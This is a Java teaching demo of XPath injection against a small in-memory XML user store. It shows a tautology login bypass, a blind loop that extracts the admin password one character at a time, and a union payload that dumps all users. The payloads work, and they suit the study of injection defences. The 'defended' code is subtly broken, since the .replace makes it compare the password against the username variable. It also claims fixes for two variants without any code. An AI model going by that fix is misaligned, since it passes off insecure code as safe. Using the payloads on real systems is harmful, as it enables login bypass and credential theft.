// Self-contained XPath Injection deep-dive (CWE-643). JDK-only (JAXP). Variants: tautology + blind.
// Reimplemented from OWASP XPath Injection / PayloadsAllTheThings (see DEEP-DIVE.md). Run: java XpathDemo
import org.w3c.dom.Document;
import org.w3c.dom.NodeList;
import org.xml.sax.InputSource;
import javax.xml.namespace.QName;
import javax.xml.parsers.DocumentBuilderFactory;
import javax.xml.xpath.*;
import java.io.StringReader;

public class XpathDemo {
    static final String USERS =
        "<users>"
      + "<user><name>arthur</name><pass>password</pass><role>USER</role></user>"
      + "<user><name>admin</name><pass>S3cr3t</pass><role>ADMIN</role></user>"
      + "</users>";

    static Document doc() throws Exception {
        DocumentBuilderFactory f = DocumentBuilderFactory.newInstance();
        f.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
        return f.newDocumentBuilder().parse(new InputSource(new StringReader(USERS)));
    }
    static NodeList vulnQuery(String q) throws Exception {
        return (NodeList) XPathFactory.newInstance().newXPath().evaluate(q, doc(), XPathConstants.NODESET);
    }

    public static void main(String[] args) throws Exception {
        // VARIANT 1: tautology - authentication bypass
        System.out.println("[VARIANT] 1) Tautologia  ' or '1'='1   (bypass de login)");
        String user = "x", pass = "' or '1'='1";
        String q = "//user[name='" + user + "' and pass='" + pass + "']"; // BUG: concatenation
        System.out.println("[VULNERAVEL] " + q);
        System.out.println("[VULNERAVEL] -> " + vulnQuery(q).getLength() + " usuario(s) casaram (bypass)");
        // FIX: bound variables
        XPath xp = XPathFactory.newInstance().newXPath();
        xp.setXPathVariableResolver((QName v) -> v.getLocalPart().equals("u") ? user : pass);
        int n = ((NodeList) xp.compile("//user[name=$u and pass=$u2]".replace("$u2", "$u"))
                .evaluate(doc(), XPathConstants.NODESET)).getLength();
        System.out.println("[DEFENDIDO] variavel vinculada -> match=" + (n > 0) + "  (aspas viram dado)");

        // VARIANT 2: blind XPath - extract the admin password char by char
        System.out.println("[VARIANT] 2) Blind XPath  (extrai a senha do admin, 1 char por vez)");
        String charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
        StringBuilder rec = new StringBuilder();
        for (int pos = 1; pos <= 6; pos++) {
            for (char ch : charset.toCharArray()) {
                String qb = "//user[name='admin' and substring(pass," + pos + ",1)='" + ch + "']";
                if (vulnQuery(qb).getLength() > 0) { rec.append(ch); break; }
            }
        }
        System.out.println("[VULNERAVEL] senha do admin reconstruida -> " + rec);
        System.out.println("[DEFENDIDO] com variavel vinculada nao ha oraculo para inferir");

        // VARIANT 3: role/attribute disclosure via injection
        System.out.println("[VARIANT] 3) Divulgacao  ']|//user  (retorna TODOS os nos)");
        String q3 = "//user[name='" + "x']|//user['1'='1" + "']"; // rewrites into "return all users"
        System.out.println("[VULNERAVEL] -> " + vulnQuery(q3).getLength() + " usuario(s) (dump total)");
        System.out.println("[DEFENDIDO] variavel vinculada trata o payload como nome literal inexistente");
    }
}
